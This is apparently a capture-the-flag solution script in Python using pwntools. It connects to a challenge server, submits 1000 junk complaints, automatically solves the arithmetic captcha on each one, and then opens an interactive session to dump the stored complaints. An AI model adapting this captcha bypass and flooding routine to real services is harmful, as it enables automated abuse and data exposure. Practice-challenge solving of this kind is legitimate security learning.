from pwn import *


HOST = "shell.cyberstakesonline.com"
PORT = 56440


def SolveCaptcha(cap):
  splitcap = cap.split(' ')
  
  a = int(splitcap[1])
  b = int(splitcap[3])
  c = int(splitcap[5])

  op1 = splitcap[2]
  op2 = splitcap[4]

  res = 0

  if op1 == '+':
    res = a + b
  elif op1 == '-':
    res = a - b
  else:
    res = a * b

  if op2 == '+':
    res = res + c
  elif op2 == '-':
    res = res - c
  else:
    res = res * c

  return str(res)


r = remote(HOST, PORT)
r.recv() # options


# lodge complaints 0-10
for i in range(11):
  r.sendline('w')
  r.recv() # >
  r.sendline('asdf')
  r.recv() # options


# lodge complaints 11-999
for i in range(989):
  r.sendline('w')
  cap = r.recv() # Captcha: 1 + 2 * 3 =
  answer = SolveCaptcha(cap)
  print cap + answer
  r.sendline(answer)
  r.recv() # >
  r.sendline('asdf')
  r.recv() # [w][r][q] >


r.interactive()
# dump complaints with [r] option


r.close()
